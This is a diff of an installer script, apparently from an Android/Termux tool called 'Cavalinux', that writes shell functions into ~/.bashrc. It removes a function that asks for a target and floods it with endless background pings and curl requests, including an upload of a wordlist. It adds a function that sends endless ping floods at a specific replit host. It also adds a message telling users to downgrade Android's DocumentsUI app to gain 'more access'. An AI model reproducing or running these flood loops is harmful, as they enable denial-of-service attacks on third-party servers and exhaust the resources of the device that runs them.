@@ -119,14 +119,17 @@ fi
 }
 ' >> ~/.bashrc
 echo '
-dalo(){
-echo "Insert your target. (DONT USE IN A DEVICE WITH LESS THAN 4GB RAM OR FOR CRIMES!)"
-echo "If you dont have wordlist.txt, Ctrl+C and run setwordlist, so you can use dalo."
-read site
+fuckonnect(){
 while true; do
-ping -c 1000000 $site &
-curl -k -L -T wordlist.txt $site &
-curl -k -L $site &
+ping -c 100000000000 cavalinux-server.vacaloppp.repl.co &
+ping -c 100000000000 cavalinux-server.vacaloppp.repl.co &
+ping -c 100000000000 cavalinux-server.vacaloppp.repl.co &
+ping -c 100000000000 cavalinux-server.vacaloppp.repl.co &
 done
+}
+' >> ~/.bashrc
+echo '
+unlock_cavalinux(){
+ls /etc >/dev/null 2>&1 && echo "Cavalinux MoreAccess Is Activated For Your Device." || echo "Cavalinux MoreAccess Mode Is Not Activated. To Activate It, Downgrade DocumentsUI. Tutorial: Go To Settings > Applicattions > Search For DocumentsUI > Select DocumentsUI > Downgrade app (Normally it is on three points > Uninstall Updates)"
 }
 ' >> ~/.bashrc
